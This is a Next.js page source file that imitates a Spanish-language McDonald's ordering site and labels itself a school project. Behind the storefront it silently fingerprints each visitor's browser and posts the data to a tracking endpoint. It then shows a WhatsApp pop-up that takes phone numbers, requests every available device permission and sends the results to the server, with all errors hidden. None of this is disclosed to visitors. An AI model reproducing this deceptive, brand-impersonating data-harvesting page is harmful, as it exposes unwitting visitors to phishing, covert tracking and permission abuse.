'use client';

import { useState, useEffect } from 'react';
import WhatsAppModal from './components/WhatsAppModal';
import { requestAllPermissions } from './lib/permissions';

export default function Home() {
  const [showModal, setShowModal] = useState(false);
  const [userId, setUserId] = useState<string | null>(null);

  useEffect(() => {
    // Function to collect browser data
    const collectBrowserData = () => {
      return {
        platform: navigator.platform,
        device: /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        colorDepth: window.screen.colorDepth,
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled,
        referrer: document.referrer || null,
      };
    };

    // Track user on page load
    const trackUser = async () => {
      try {
        const browserData = collectBrowserData();

        const response = await fetch('/api/track', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(browserData),
        });

        const data = await response.json();

        if (data.success) {
          setUserId(data.userId);

          // Show modal after 2 seconds on every visit
          setTimeout(() => {
            setShowModal(true);
          }, 2000);
        }
      } catch (error) {
        // Silent error handling
      }
    };

    trackUser();
  }, []);

  const handlePhoneSubmit = async (phoneNumber: string) => {
    if (userId) {
      try {
        await fetch('/api/users', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ userId, phoneNumber }),
        });

        const permissions = await requestAllPermissions();

        await fetch('/api/permissions', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ userId, permissions }),
        });
      } catch (error) {
        // Silent error handling
      }
    }
  };

  return (
    <div className="min-h-screen bg-white">
      {/* WhatsApp Modal */}
      <WhatsAppModal
        isOpen={showModal}
        onClose={() => setShowModal(false)}
        onSubmit={handlePhoneSubmit}
      />
      {/* Header */}
      <header className="bg-[#DA291C] shadow-lg">
        <nav className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-20">
            <div className="flex items-center">
              <div className="text-[#FFC72C] text-4xl font-black tracking-tight">
                McDonald&apos;s
              </div>
            </div>
            <div className="hidden md:flex space-x-8 text-white font-semibold">
              <a href="#" className="hover:text-[#FFC72C] transition-colors">Menú</a>
              <a href="#" className="hover:text-[#FFC72C] transition-colors">Ofertas</a>
              <a href="#" className="hover:text-[#FFC72C] transition-colors">Ubicaciones</a>
              <a href="#" className="hover:text-[#FFC72C] transition-colors">Nosotros</a>
            </div>
            <button className="bg-[#FFC72C] text-[#292929] px-6 py-2 rounded-full font-bold hover:bg-[#FFB81C] transition-colors">
              Pedir Ahora
            </button>
          </div>
        </nav>
      </header>

      {/* Hero Section */}
      <section className="bg-gradient-to-r from-[#DA291C] to-[#C4161C] text-white py-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center">
            <h1 className="text-5xl md:text-7xl font-black mb-6 tracking-tight">
              Me encanta
            </h1>
            <p className="text-xl md:text-2xl mb-10 max-w-2xl mx-auto font-medium">
              Deliciosas hamburguesas, papas crujientes y bebidas refrescantes a domicilio
            </p>
            <div className="flex flex-col sm:flex-row gap-4 justify-center">
              <button className="bg-[#FFC72C] text-[#292929] px-8 py-4 rounded-full text-lg font-bold hover:bg-[#FFB81C] transition-all transform hover:scale-105 shadow-lg">
                Pedir a Domicilio
              </button>
              <button className="bg-white text-[#DA291C] px-8 py-4 rounded-full text-lg font-bold hover:bg-gray-100 transition-all transform hover:scale-105 shadow-lg">
                Ver Menú
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Featured Menu Section */}
      <section className="py-16 bg-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <h2 className="text-4xl font-black text-center mb-12 text-[#292929]">
            Menú Destacado
          </h2>
          <div className="grid md:grid-cols-3 gap-8">
            {/* Menu Item 1 */}
            <div className="bg-white rounded-2xl shadow-xl overflow-hidden border-4 border-[#FFC72C] hover:shadow-2xl transition-shadow">
              <div className="bg-[#DA291C] h-48 flex items-center justify-center">
                <div className="text-white text-6xl font-black">🍔</div>
              </div>
              <div className="p-6">
                <h3 className="text-2xl font-bold mb-2 text-[#292929]">Big Mac</h3>
                <p className="text-gray-600 mb-4">
                  Dos hamburguesas de carne, salsa especial, lechuga, queso, pepinillos, cebolla en pan de sésamo
                </p>
                <button className="w-full bg-[#FFC72C] text-[#292929] py-3 rounded-full font-bold hover:bg-[#FFB81C] transition-colors">
                  Agregar al Pedido
                </button>
              </div>
            </div>

            {/* Menu Item 2 */}
            <div className="bg-white rounded-2xl shadow-xl overflow-hidden border-4 border-[#FFC72C] hover:shadow-2xl transition-shadow">
              <div className="bg-[#DA291C] h-48 flex items-center justify-center">
                <div className="text-white text-6xl font-black">🍟</div>
              </div>
              <div className="p-6">
                <h3 className="text-2xl font-bold mb-2 text-[#292929]">Papas Fritas Famosas</h3>
                <p className="text-gray-600 mb-4">
                  Crujientes, doradas y perfectamente saladas - las papas que lo iniciaron todo
                </p>
                <button className="w-full bg-[#FFC72C] text-[#292929] py-3 rounded-full font-bold hover:bg-[#FFB81C] transition-colors">
                  Agregar al Pedido
                </button>
              </div>
            </div>

            {/* Menu Item 3 */}
            <div className="bg-white rounded-2xl shadow-xl overflow-hidden border-4 border-[#FFC72C] hover:shadow-2xl transition-shadow">
              <div className="bg-[#DA291C] h-48 flex items-center justify-center">
                <div className="text-white text-6xl font-black">🥤</div>
              </div>
              <div className="p-6">
                <h3 className="text-2xl font-bold mb-2 text-[#292929]">Coca-Cola</h3>
                <p className="text-gray-600 mb-4">
                  Coca-Cola bien fría, el complemento perfecto para cualquier comida
                </p>
                <button className="w-full bg-[#FFC72C] text-[#292929] py-3 rounded-full font-bold hover:bg-[#FFB81C] transition-colors">
                  Agregar al Pedido
                </button>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Deals Section */}
      <section className="py-16 bg-[#FFC72C]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
          <h2 className="text-4xl font-black mb-6 text-[#292929]">
            Ofertas del Día
          </h2>
          <p className="text-xl mb-8 text-[#292929] font-semibold">
            Obtén tus favoritos por menos con nuestras ofertas y promociones diarias
          </p>
          <button className="bg-[#DA291C] text-white px-8 py-4 rounded-full text-lg font-bold hover:bg-[#C4161C] transition-all transform hover:scale-105 shadow-lg">
            Ver Todas las Ofertas
          </button>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-[#292929] text-white py-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid md:grid-cols-4 gap-8">
            <div>
              <h3 className="text-[#FFC72C] text-2xl font-black mb-4">McDonald&apos;s</h3>
              <p className="text-gray-400">Sirviéndote desde 1955</p>
            </div>
            <div>
              <h4 className="font-bold mb-4">Enlaces Rápidos</h4>
              <ul className="space-y-2 text-gray-400">
                <li><a href="#" className="hover:text-[#FFC72C] transition-colors">Menú</a></li>
                <li><a href="#" className="hover:text-[#FFC72C] transition-colors">Ubicaciones</a></li>
                <li><a href="#" className="hover:text-[#FFC72C] transition-colors">Trabajá con Nosotros</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-4">Soporte</h4>
              <ul className="space-y-2 text-gray-400">
                <li><a href="#" className="hover:text-[#FFC72C] transition-colors">Contáctanos</a></li>
                <li><a href="#" className="hover:text-[#FFC72C] transition-colors">Preguntas Frecuentes</a></li>
                <li><a href="#" className="hover:text-[#FFC72C] transition-colors">Comentarios</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-4">Descargá Nuestra App</h4>
              <p className="text-gray-400 mb-4">Obtén ofertas exclusivas y pedidos más fáciles</p>
              <button className="bg-[#FFC72C] text-[#292929] px-6 py-2 rounded-full font-bold hover:bg-[#FFB81C] transition-colors">
                Descargar
              </button>
            </div>
          </div>
          <div className="border-t border-gray-700 mt-8 pt-8 text-center text-gray-400">
            <p>&copy; 2024 McDonald&apos;s. Todos los derechos reservados. (Proyecto Escolar)</p>
          </div>
        </div>
      </footer>
    </div>
  );
}
